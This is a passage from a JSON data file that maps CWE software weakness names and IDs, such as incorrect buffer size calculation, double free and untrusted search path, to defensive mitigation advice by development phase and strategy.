red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When accessing a user-controlled array index, use a stringent range of values that are within the target array. Make sure that you do not allow negative values to be used. That is, verify the minimum as well as the maximum of the range of acceptable values.::PHASE:Implementation:DESCRIPTION:Be especially careful to validate all input when invoking code that crosses language boundaries, such as from an interpreted language to native code. This could create an unexpected interaction between the language boundaries. Ensure that you are not violating any of the expectations of the language with which you are interfacing. For example, even though Java may not be susceptible to buffer overflows, providing a large argument in a call to native code might trigger an overflow.::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::"
    ],
    [
      "incorrect calculation of buffer size",
      "CWE-131",
      "::PHASE:Implementation:DESCRIPTION:When allocating a buffer for the purpose of transforming, converting, or encoding an input, allocate enough memory to handle the largest possible encoding. For example, in a routine that converts & characters to &amp; for HTML entity encoding, the output buffer needs to be at least 5 times as large as the input buffer.::PHASE:Implementation:DESCRIPTION:Understand the programming language's underlying representation and how it interacts with numeric calculation (CWE-681). Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, not-a-number calculations, and how the language handles numbers that are too large or too small for its underlying representation. [REF-7] Also be careful to account for 32-bit, 64-bit, and other potential differences that may affect the numeric representation.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Perform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Implementation:DESCRIPTION:When processing structured incoming data containing a size field followed by raw data, identify and resolve any inconsistencies between the size field and the actual size of the data (CWE-130).::PHASE:Implementation:DESCRIPTION:When allocating memory that uses sentinels to mark the end of a data structure - such as NUL bytes in strings - make sure you also include the sentinel in your calculation of the total amount of memory that must be allocated.::PHASE:Implementation:DESCRIPTION:Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.:EFFECTIVENESS:Moderate::PHASE:Implementation:DESCRIPTION:Use sizeof() on the appropriate data type to avoid CWE-467.::PHASE:Implementation:DESCRIPTION:Use the appropriate type for the desired action. For example, in C/C++, only use unsigned types for values that could never be negative, such as height, width, or other numbers related to quantity. This will simplify validation and will reduce surprises related to unexpected casting.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Use libraries or frameworks that make it easier to handle numbers without unexpected consequences, or buffer allocation routines that automatically track buffer size. Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++). [REF-106]::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.:EFFECTIVENESS:Defense in Depth::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as rebasing (for Windows) and prelinking (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].:EFFECTIVENESS:Defense in Depth::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment. For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:STRATEGY:Compilation or Build Hardening:DESCRIPTION:Examine compiler warnings closely and eliminate problems with potential security implications, such as signed / unsigned mismatch in memory operations, or use of uninitialized variables. Even if the weakness is rarely exploitable, a single failure may lead to the compromise of the entire system.::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::"
    ],
    [
      "use of externally-controlled format string",
      "CWE-134",
      "::PHASE:Requirements:DESCRIPTION:Choose a language that is not subject to this flaw.::PHASE:Implementation:DESCRIPTION:Ensure that all format string functions are passed a static string which cannot be controlled by the user, and that the proper number of arguments are always sent to that function as well. If at all possible, use functions that do not support the %n operator in format strings. [REF-116] [REF-117]::PHASE:Build and Compilation:DESCRIPTION:Run compilers and linkers with high warning levels, since they may detect incorrect usage.::"
    ],
    [
      "improper neutralization of null byte or nul character",
      "CWE-158",
      "::PHASE::DESCRIPTION:Developers should anticipate that null characters or null bytes will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::"
    ],
    [
      "improper null termination",
      "CWE-170",
      "::PHASE:Requirements:DESCRIPTION:Use a language that is not susceptible to these issues. However, be careful of null byte interaction errors (CWE-626) with lower-level constructs that may be written in a language that is susceptible.::PHASE:Implementation:DESCRIPTION:Ensure that all string functions used are understood fully as to how they append null characters. Also, be wary of off-by-one errors when appending nulls to the end of strings.::PHASE:Implementation:DESCRIPTION:If performance constraints permit, special code can be added that validates null-termination of string buffers, this is a rather naive and error-prone solution.::PHASE:Implementation:DESCRIPTION:Switch to bounded string manipulation functions. Inspect buffer lengths involved in the buffer overrun trace reported with the defect.::PHASE:Implementation:DESCRIPTION:Add code that fills buffers with nulls (however, the length of buffers still needs to be inspected, to ensure that the non null-terminated string is not written at the physical end of the buffer).::"
    ],
    [
      "double decoding of the same data",
      "CWE-174",
      "::PHASE:Architecture and Design:STRATEGY:Input Validation:DESCRIPTION:Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::"
    ],
    [
      "integer coercion error",
      "CWE-192",
      "::PHASE:Requirements:DESCRIPTION:A language which throws exceptions on ambiguous data casts might be chosen.::PHASE:Architecture and Design:DESCRIPTION:Design objects and program flow such that multiple or complex casts are unnecessary::PHASE:Implementation:DESCRIPTION:Ensure that any data type casting that you must used is entirely understood in order to reduce the plausibility of error in use.::"
    ],
    [
      "signed to unsigned conversion error",
      "CWE-195",
      ""
    ],
    [
      "unsigned to signed conversion error",
      "CWE-196",
      "::PHASE:Requirements:DESCRIPTION:Choose a language which is not subject to these casting flaws.::PHASE:Architecture and Design:DESCRIPTION:Design object accessor functions to implicitly check values for valid sizes. Ensure that all functions which will be used as a size are checked previous to use as a size. If the language permits, throw exceptions rather than using in-band errors.::PHASE:Implementation:DESCRIPTION:Error check the return values of all functions. Be aware of implicit casts made, and use unsigned variables for sizes if at all possible.::"
    ],
    [
      "use of incorrect byte ordering",
      "CWE-198",
      ""
    ],
    [
      "insertion of sensitive information into sent data",
      "CWE-201",
      "::PHASE:Requirements:DESCRIPTION:Specify which data in the software should be regarded as sensitive. Consider which types of users should have access to which types of data.::PHASE:Implementation:DESCRIPTION:Ensure that any possibly sensitive data specified in the requirements is verified with designers to ensure that it is either a calculated risk or mitigated elsewhere. Any information that is not necessary to the functionality should be removed in order to lower both the overhead and the possibility of security sensitive data being sent.::PHASE:System Configuration:DESCRIPTION:Setup default error messages so that unexpected errors do not disclose sensitive information.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::"
    ],
    [
      "generation of error message containing sensitive information",
      "CWE-209",
      "::PHASE:Implementation:DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success. If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.::PHASE:Implementation:DESCRIPTION:Handle exceptions internally and do not display errors containing potentially sensitive information to a user.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.:EFFECTIVENESS:Defense in Depth::PHASE:Implementation Build and Compilation:STRATEGY:Compilation or Build Hardening:DESCRIPTION:Debugging information should not make its way into a production release.::PHASE:Implementation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Debugging information should not make its way into a production release.::PHASE:System Configuration:DESCRIPTION:Where available, configure the environment to use less verbose error messages. For example, in PHP, disable the display_errors setting during configuration, or at runtime using the error_reporting() function.::PHASE:System Configuration:DESCRIPTION:Create default error pages or messages that do not leak any information.::"
    ],
    [
      "failure to handle missing parameter",
      "CWE-234",
      "::PHASE:Build and Compilation:DESCRIPTION:This issue can be simply combated with the use of proper build process.::PHASE:Implementation:DESCRIPTION:Forward declare all functions. This is the recommended solution. Properly forward declaration of all used functions will result in a compiler error if too few arguments are sent to a function.::"
    ],
    [
      "failure to handle incomplete element",
      "CWE-239",
      ""
    ],
    [
      "use of inherently dangerous function",
      "CWE-242",
      "::PHASE:Implementation Requirements:DESCRIPTION:Ban the use of dangerous functions. Use their safe equivalent.::PHASE:Testing:DESCRIPTION:Use grep or static analysis tools to spot usage of dangerous functions.::"
    ],
    [
      "uncaught exception",
      "CWE-248",
      ""
    ],
    [
      "unchecked return value",
      "CWE-252",
      "::PHASE:Implementation:DESCRIPTION:Check the results of all functions that return a value and verify that the value is expected.:EFFECTIVENESS:High::PHASE:Implementation:DESCRIPTION:Ensure that you account for all possible return values from the function.::PHASE:Implementation:DESCRIPTION:When designing a function, make sure you return a value or throw an exception in case of an error.::"
    ],
    [
      "incorrect check of function return value",
      "CWE-253",
      "::PHASE:Architecture and Design:STRATEGY:Language Selection:DESCRIPTION:Use a language or compiler that uses exceptions and requires the catching of those exceptions.::PHASE:Implementation:DESCRIPTION:Properly check all functions which return a value.::PHASE:Implementation:DESCRIPTION:When designing any function make sure you return a value or throw an exception in case of an error.::"
    ],
    [
      "reliance on ip address for authentication",
      "CWE-291",
      "::PHASE:Architecture and Design:DESCRIPTION:Use other means of identity verification that cannot be simply spoofed. Possibilities include a username/password or certificate.::"
    ],
    [
      "missing authentication for critical function",
      "CWE-306",
      "::PHASE:Architecture and Design:DESCRIPTION:Divide the software into anonymous, normal, privileged, and administrative areas. Identify which of these areas require a proven user identity, and use a centralized authentication capability. Identify all potential communication channels, or other means of interaction with the software, to ensure that all channels are appropriately protected, including those channels that are assumed to be accessible only by authorized parties. Developers sometimes perform authentication at the primary channel, but open up a secondary channel that is assumed to be private. For example, a login mechanism may be listening on one network port, but after successful authentication, it may open up a second port where it waits for the connection, but avoids authentication because it assumes that only the authenticated party will connect to the port. In general, if the software or protocol allows a single session or user state to persist across multiple connections or channels, authentication and appropriate credential management need to be used throughout.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Architecture and Design:DESCRIPTION:Where possible, avoid implementing custom, grow-your-own authentication routines and consider using authentication capabilities as provided by the surrounding framework, operating system, or environment. These capabilities may avoid common weaknesses that are unique to authentication; support automatic auditing and tracking; and make it easier to provide a clear separation between authentication tasks and authorization tasks. In environments such as the World Wide Web, the line between authentication and authorization is sometimes blurred. If custom authentication routines are required instead of those provided by the server, then these routines must be applied to every single page, since these pages could be requested directly.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator [REF-45].::PHASE:Implementation System Configuration Operation:DESCRIPTION:When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to require strong authentication for users who should be allowed to access the data [REF-1297] [REF-1298] [REF-1302].::"
    ],
    [
      "use of password system for primary authentication",
      "CWE-309",
      "::PHASE:Architecture and Design:DESCRIPTION:In order to protect password systems from compromise, the following should be noted: Passwords should be stored safely to prevent insider attack and to ensure that -- if a system is compromised -- the passwords are not retrievable. Due to password reuse, this information may be useful in the compromise of other systems these users work with. In order to protect these passwords, they should be stored encrypted, in a non-reversible state, such that the original text password cannot be extracted from the stored value. Password aging should be strictly enforced to ensure that passwords do not remain unchanged for long periods of time. The longer a password remains in use, the higher the probability that it has been compromised. For this reason, passwords should require refreshing periodically, and users should be informed of the risk of passwords which remain in use for too long. Password strength should be enforced intelligently. Rather than restrict passwords to specific content, or specific length, users should be encouraged to use upper and lower case letters, numbers, and symbols in their passwords. The system should also ensure that no passwords are derived from dictionary words.::PHASE:Architecture and Design:DESCRIPTION:Use a zero-knowledge password protocol, such as SRP.::PHASE:Architecture and Design:DESCRIPTION:Ensure that passwords are stored safely and are not reversible.::PHASE:Architecture and Design:DESCRIPTION:Implement password aging functionality that requires passwords be changed after a certain point.::PHASE:Architecture and Design:DESCRIPTION:Use a mechanism for determining the strength of a password and notify the user of weak password use.::PHASE:Architecture and Design:DESCRIPTION:Inform the user of why password protections are in place, how they work to protect data integrity, and why it is important to heed their warnings.::"
    ],
    [
      "cleartext storage in a file or on disk",
      "CWE-313",
      ""
    ],
    [
      "cleartext storage of sensitive information in a cookie",
      "CWE-315",
      ""
    ],
    [
      "cleartext storage of sensitive information in memory",
      "CWE-316",
      ""
    ],
    [
      "use of a key past its expiration date",
      "CWE-324",
      "::PHASE:Architecture and Design:DESCRIPTION:Adequate consideration should be put in to the user interface in order to notify users previous to the key's expiration, to explain the importance of new key generation and to walk users through the process as painlessly as possible.::"
    ],
    [
      "generation of predictable iv with cbc mode",
      "CWE-329",
      "::PHASE:Implementation:DESCRIPTION:NIST recommends two methods of generating unpredictable IVs for CBC mode [REF-1172]. The first is to generate the IV randomly. The second method is to encrypt a nonce with the same key and cipher to be used to encrypt the plaintext. In this case the nonce must be unique but can be predictable, since the block cipher will act as a pseudo random permutation.::"
    ],
    [
      "use of invariant value in dynamically changing context",
      "CWE-344",
      ""
    ],
    [
      "use of less trusted source",
      "CWE-348",
      ""
    ],
    [
      "improperly implemented security check for standard",
      "CWE-358",
      ""
    ],
    [
      "trust of system event data",
      "CWE-360",
      "::PHASE:Architecture and Design:DESCRIPTION:Never trust or rely any of the information in an Event for security.::"
    ],
    [
      "divide by zero",
      "CWE-369",
      ""
    ],
    [
      "missing check for certificate revocation after initial check",
      "CWE-370",
      "::PHASE:Architecture and Design:DESCRIPTION:Ensure that certificates are checked for revoked status before each use of a protected resource. If the certificate is checked before each access of a protected resource, the delay subject to a possible race condition becomes almost negligible and significantly reduces the risk associated with this issue.::"
    ],
    [
      "missing report of error condition",
      "CWE-392",
      ""
    ],
    [
      "return of wrong status code",
      "CWE-393",
      ""
    ],
    [
      "unexpected status code or return value",
      "CWE-394",
      ""
    ],
    [
      "use of nullpointerexception catch to detect null pointer dereference",
      "CWE-395",
      "::PHASE:Architecture and Design Implementation:DESCRIPTION:Do not extensively rely on catching exceptions (especially for validating user input) to handle errors. Handling exceptions can decrease the performance of an application.::"
    ],
    [
      "missing lock check",
      "CWE-414",
      "::PHASE:Architecture and Design Implementation:DESCRIPTION:Implement a reliable lock mechanism.::"
    ],
    [
      "double free",
      "CWE-415",
      "::PHASE:Architecture and Design:DESCRIPTION:Choose a language that provides automatic memory management.::PHASE:Implementation:DESCRIPTION:Ensure that each allocation is freed only once. After freeing a chunk, set the pointer to NULL to ensure the pointer cannot be freed again. In complicated error conditions, be sure that clean-up routines respect the state of allocation properly. If the language is object oriented, ensure that object destructors delete each chunk of memory only once.::PHASE:Implementation:DESCRIPTION:Use a static analysis tool to find double free instances.::"
    ],
    [
      "use after free",
      "CWE-416",
      "::PHASE:Architecture and Design:STRATEGY:Language Selection:DESCRIPTION:Choose a language that provides automatic memory management.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:When freeing pointers, be sure to set them to NULL once they are freed. However, the utilization of multiple or complex data structures may lower the usefulness of this strategy.:EFFECTIVENESS:Defense in Depth::"
    ],
    [
      "untrusted search path",
      "CWE-426",
      "::PHASE:Architecture and Design Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Hard-code the search path to a set of known-safe values (such as system directories), or only allow them to be specified by the administrator in a configuration file. Do not allow these settings to be modified by an external party. Be careful to avoid related weaknesses such as CWE-426 and CWE-428.::PHASE:Implementation:DESCRIPTION:When invoking other programs, specify those programs using fully-qualified pathnames. While this is an effective approach, code that uses fully-qualified pathnames might not be portable to other systems that do not use the same pathnames. The portability can be improved by locating the full-qualified paths in a centralized, easily-modifiable location within the source code, and having the code refer to these paths.::PHASE:Implementation:DESCRIPTION:Remove or restrict all environment settings before invoking other programs. This includes the PATH environment variable, LD_LIBRARY_PATH, and other settings that identify the location of code libraries, and any application-specific search paths.::PHASE:Implementation:DESCRIPTION:Check your search path before use and remove any elements that are likely to be unsafe, such as the current working directory or a temporary files directory.::PHASE:Implementation:DESCRIPTION:Use other functions that require explicit paths. Making use of any of the other readily available functions that require explicit paths is a safe way to avoid this problem. For example, system() in C does not require a full path since the shell can take care of it, while execl() and execv() require a full path.::"
    ],
    [
      "unquoted search path or element",
      "CWE-428",
      "::PHASE:Implementation:DESCRIPTION:Properly quote the full search path before executing a program on the system.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::"
    ],
    [
      "deployment of wrong handler",
      "CWE-430",
      "::PHASE:Architecture and Design:DESCRIPTION:Perform a type check before interpreting an object.::PHASE:Architecture and Design:DESCRIPTION:Reject any inconsistent types, such as a file with a .GIF extension that appears to consist of PHP code.::"
    ],
    [
      "behavioral change in new version or environment",
      "CWE-439",
      ""
    ],
    [
      "ui discrepancy for security feature",
      "CWE-446",
      ""
    ],
    [
      "unimplemented or unsupported feature in ui",
      "CWE-447",
      "::PHASE:Testing:DESCRIPTION:Perform functionality testing before deploying the application.::"
    ],
    [
      "obsolete feature in ui",
      "CWE-448",
      "::PHASE:Architecture and Design:DESCRIPTION:Remove the obsolete feature from the UI. Warn the user that the feature is no longer supported.::"
    ],
    [
      "the ui performs the wrong action",
      "CWE-449",
      "::PHASE:Testing:DESCRIPTION:Perform extensive functionality testing of the UI. The UI should behave as specified.::"
    ],
    [
      "user interface (ui) misrepresentation of critical information",
      "CWE-451",
      "::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Perform data validation (e.g. syntax, length, etc.) before interpreting the data.::PHASE:Architecture and Design:STRATEGY:Output Encoding:DESCRIPTION:Create a strategy for presenting information, and plan for how to display unusual characters.::"
    ],
    [
      "missing initialization of a variable",
      "CWE-456",
      "::PHASE:Implementation:DESCRIPTION:Check that critical variables are initialized.::PHASE:Testing:DESCRIPTION:Use a static analysis tool to spot non-initialized variables.::"
    ],
    [
      "use of uninitialized variable",
      "CWE-457",
      "::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Assign all variables to an initial value.::PHASE:Build and Compilation:STRATEGY:Compilation or Build Hardening:DESCRIPTION:Most compilers will complain about the use of uninitialized variables if warnings are turned on.::PHASE:Implementation Operation:DESCRIPTION:When using a language that does not require explicit declaration of variables, run or compile the software in a mode that reports undeclared or unknown variables. This may indicate the presence of a typographic error in the variable's name.::PHASE:Requirements:DESCRIPTION:The choice could be made to use a language that is not susceptible to these issues.::PHASE:Architecture and Design:DESCRIPTION:Mitigating technologies such as safe string libraries and container abstractions could be introduced.::"
    ],
    [
      "return of pointer value outside of expected range",
      "CWE-466",
      ""
    ],
    [
      "use of sizeof() on a pointer type",
      "CWE-467",
      "::PHASE:Implementation:DESCRIPTION:Use expressions such as sizeof(*pointer) instead of sizeof(pointer), unless you intend to run sizeof() on a pointer type to gain some platform independence or if you are allocating a variable on the stack.::"
    ],
    [
      "use of pointer subtraction to determine size",
      "CWE-469",
      "::PHASE:Implementation:DESCRIPTION:Save an index variable. This is the recommended solution. Rather than subtract pointers from one another, use an index variable of the same size as the pointers in question. Use this variable to walk from one pointer to the other and calculate the difference. Always validate this number.::"
    ],
    [
      "external control of assumed-immutable web parameter",
      "CWE-472",
      "::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::"
    ],
    [
      "null pointer dereference",
      "CWE-476",
      "::PHASE:Implementation:DESCRIPTION:For any pointers that could have been modified or provided from a function that can return NULL, check the pointer for NULL before use. When working with a multithreaded or otherwise asynchronous environment, ensure that proper locking APIs are used to lock before the check, and unlock when it has finished.::PHASE:Requirements:DESCRIPTION:Select a programming language that is not susceptible to these issues.::PHASE:Implementation:DESCRIPTION:Check the results of all functions that return a value and verify that the value is non-null before acting upon it.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design:DESCRIPTION:Identify all variables and data stores that receive information from external sources, and apply input validation to make sure that they are only initialized to expected values.::PHASE:Implementation:DESCRIPTION:Explicitly initialize all variables and other data stores, either during declaration or just before the first usage.::"
    ],
    [
      "use of obsolete function",
      "CWE-477",
      "::PHASE:Implementation:DESCRIPTION:Refer to the documentation for the obsolete function in order to determine why it is deprecated or obsolete and to learn about alternative ways to achieve the same functionality.::PHASE:Requirements:DESCRIPTION:Consider seriously the security implications of using an obsolete function. Consider using alternate functions.::"
    ],
    [
      "signal handler use of a non-reentrant function",
      "CWE-479",
      "::PHASE:Requirements:DESCRIPTION:Require languages or libraries that provide reentrant functionality, or otherwise make it easier to avoid this weakness.::PHASE:Architecture and Design:DESCRIPTION:Design signal handlers to only set flags rather than perform complex functionality.::PHASE:Implementation:DESCRIPTION:Ensure that non-reentrant functions are not found in signal handlers.::PHASE:Implementation:DESCRIPTION:Use sanity checks to reduce the timing window for exploitation of race conditions. This is only a partial solution, since many attacks might fail, but other attacks still might work within the narrower window, even accidentally.:EFFECTIVENESS:Defense in Depth::"
    ],
    [
      "omitted break statement in switch",
      "CWE-484",
      "::PHASE:Implementation:DESCRIPTION:Omitting a break statement so that one may fall through is often indistinguishable from an error, and therefore should be avoided. If you need to use fall-through capabilities, make sure that you have clearly documented this within the switch statement, and ensure that you have examined all the logical possibilities.::PHASE:Implementation:DESCRIPTION:The functionality of omitting a break statement could be clarified with an if statement. This method is much safer.::"
    ],
    [
      "comparison of classes by name",
      "CWE-486",
      "::PHASE:Implementation:DESCRIPTION:Use class equivalency to determine type. Rather than use the class name to determine if an object is of a given type, use the getClass() method, and == operator.::"
    ],
    [
      "exposure of data element to wrong session",
      "CWE-488",
      "::PHASE:Architecture and Design:DESCRIPTION:Protect the application's sessions from information leakage. Make sure that a session's data is not used or visible by other sessions.::PHASE:Testing:DESCRIPTION:Use a static analysis tool to scan the code for information leakage vulnerabilities (e.g. Singleton Member Field).::PHASE:Architecture and Design:DESCRIPTION:In a multithreading environment, storing user data in Servlet member fields introduces a data access race condition. Do not use member fields to store information in the Servlet.::"
    ],
    [
      "active debug code",
      "CWE-489",
